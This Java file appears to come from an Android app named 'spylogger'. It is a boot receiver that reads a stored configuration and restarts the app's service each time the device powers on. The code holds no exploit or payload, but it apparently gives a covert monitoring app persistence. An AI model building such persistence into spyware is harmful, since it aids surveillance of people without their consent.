package com.gravatasufoca.spylogger.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
import com.gravatasufoca.spylogger.utils.Utils;

import java.sql.SQLException;


public class BootStarter extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {

		try {
			RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);

			Configuracao configuracao= repositorioConfiguracao.getConfiguracao();
			Utils.startNewService(context,configuracao);


		} catch (SQLException e) {
			e.printStackTrace();
		}

	}
}